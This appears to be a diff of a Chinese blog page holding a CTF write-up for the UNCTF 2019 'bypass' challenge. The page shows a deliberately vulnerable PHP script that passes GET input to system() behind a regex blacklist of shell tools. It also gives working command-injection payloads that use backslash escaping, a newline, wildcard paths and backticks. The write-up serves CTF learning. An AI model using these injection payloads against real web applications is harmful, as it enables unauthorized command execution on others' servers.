@@ -321,8 +321,7 @@
       
         <h2 id="rce，正则匹配特点，文件通配符，命令换行，命令注释"><a href="#rce，正则匹配特点，文件通配符，命令换行，命令注释" class="headerlink" title="rce，正则匹配特点，文件通配符，命令换行，命令注释"></a>rce，正则匹配特点，文件通配符，命令换行，命令注释</h2><a id="more"></a>
 <figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    <span class="keyword">$a = $_GET['a'];</span></span><br><span class="line"><span class="keyword">    $b = $_GET['b'];</span></span><br><span class="line"><span class="keyword"> // try bypass it</span></span><br><span class="line"><span class="keyword">    if </span>(preg_match("/<span class="symbol">\'</span>|<span class="symbol">\"</span>|,|;|<span class="symbol">\\</span>|<span class="symbol">\`</span>|<span class="symbol">\*</span>|<span class="symbol">\n</span>|<span class="symbol">\t</span>|<span class="symbol">\x</span>A0|<span class="symbol">\r</span>|<span class="symbol">\&#123;</span>|<span class="symbol">\&#125;</span>|<span class="symbol">\(</span>|<span class="symbol">\)</span>|&lt;|<span class="symbol">\&amp;</span>[^<span class="symbol">\d</span>]|@|<span class="symbol">\|</span>|tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", <span class="keyword">$a))</span></span><br><span class="line"><span class="keyword">        $a = "";</span></span><br><span class="line"><span class="keyword">        $a ='"' . $a . '"';</span></span><br><span class="line"><span class="keyword">    if </span>(preg_match("/<span class="symbol">\'</span>|<span class="symbol">\"</span>|;|,|<span class="symbol">\`</span>|<span class="symbol">\*</span>|<span class="symbol">\\</span>|<span class="symbol">\n</span>|<span class="symbol">\t</span>|<span class="symbol">\r</span>|<span class="symbol">\x</span>A0|<span class="symbol">\&#123;</span>|<span class="symbol">\&#125;</span>|<span class="symbol">\(</span>|<span class="symbol">\)</span>|&lt;|<span class="symbol">\&amp;</span>[^<span class="symbol">\d</span>]|@|<span class="symbol">\|</span>|tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", <span class="keyword">$b))</span></span><br><span class="line"><span class="keyword">        $b = "";</span></span><br><span class="line"><span class="keyword">        $b = '"' . $b . '"';</span></span><br><span class="line"><span class="keyword">     $cmd = "file $a $b";</span></span><br><span class="line"><span class="keyword">      str_replace</span>(" ","","<span class="keyword">$cmd"); </span></span><br><span class="line"><span class="keyword">     system</span>(<span class="keyword">$cmd);</span></span><br><span class="line"><span class="keyword">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>正则中有一段<br><br><code>\\|</code><br><br>会将|进行转义，这是因为在preg_match中，三个反斜杠\\才能匹配一个真正意义上的字符反斜杠\，所以这里因为正则的匹配机制造成了反引号逃逸。<br><br>传入a，b后会再前后加上双引号，所以我们可以利用 \ 给a后面的”进行转义，然后让前面的”匹配b前面的,然后利用%0a,来造成命令换行，利用#号来进行命令终结。<br><br>实质上还是因为正则\匹配不到\的问题再结合linux的命令终止符%20#处理双引号.<br><br><b>最终的payload为：</b><br><br><code>?a=\&amp;b=%0a/???/gr?p -r ctf %23     %23=&#39;#&#39;
-或?a=\&amp;b=%0a/???/gr[d-f]p+-r+.+%23</code><br><br><b>我的思路是因为正则匹配禁用了bin，所以估计实在bin目录下</b></p>
+<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>正则中有一段<br><br><code>\\|</code><br><br>会将|进行转义，这是因为在preg_match中，三个反斜杠\\才能匹配一个真正意义上的字符反斜杠\，所以这里因为正则的匹配机制造成了反引号逃逸。<br><br>传入a，b后会再前后加上双引号，所以我们可以利用 \ 给a后面的”进行转义，然后让前面的”匹配b前面的,然后利用%0a,来造成命令换行，利用#号来进行命令终结。<br><br>实质上还是因为正则\匹配不到\的问题再结合linux的命令终止符%20#处理双引号.<br><br><b>最终的payload为：</b><br><br><code>?a=\&amp;b=%0a/???/gr?p -r ctf %23     %23=&#39;#&#39; 或?a=\&amp;b=%0a/???/gr[d-f]p+-r+.+%23</code><br><br><b>我的思路是因为正则匹配禁用了bin，所以估计实在bin目录下</b></p>
 <h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>这边正则没有过滤 ``反引号间的内容，会被shell先执行。其输出被放入主命令后，主命令再被执行。<br><br>dir列目录<br><br><code>?a=`dir%20/</code><br></p>
 <img src="/2019/11/21/2019UNCTF-bypass/1.jpg" class="">
 <p>试试grep查找flag<br></p>
@@ -406,7 +405,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">94</span>
+          <span class="site-state-item-count">95</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -478,7 +477,7 @@
 <div class="copyright">
   
   &copy; 2018 – 
-  <span itemprop="copyrightYear">2023</span>
+  <span itemprop="copyrightYear">2024</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
